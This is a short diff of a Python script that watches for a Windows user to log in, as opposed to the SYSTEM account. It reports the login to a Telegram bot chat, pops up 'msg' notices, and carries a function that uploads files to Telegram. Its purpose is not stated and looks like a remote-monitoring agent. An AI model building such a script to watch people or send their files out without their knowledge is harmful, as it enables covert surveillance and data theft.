@@ -23,18 +23,18 @@ def send_file(chat_id, token, filepath):
     r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)
 
 def is_user_logged_in():
-    output = subprocess.check_output(["echo", "%username%"], shell=True, text=True)
-    if "SYSTEM" in str(output):
-        return False
+    output = subprocess.check_output(["echo", "%username%"], shell=True, text=True).strip()
+    if "SYSTEM" in output:
+        return False, output
     else:
-        return True
+        return True, output
 
 while True:
-    if is_user_logged_in() == True:
-        send_message(chat_id, token, "User loged.")
-        os.system("msg * loged")
+    logged_in, output = is_user_logged_in()
+    if logged_in:
+        send_message(chat_id, token, "User logged.")
+        os.system(f"msg * logged:{str(output)}")
         break
     else:
         time.sleep(5)
-        os.system("msg * notloged")
-        pass
+        os.system(f"msg * notlogged:{str(output)}")
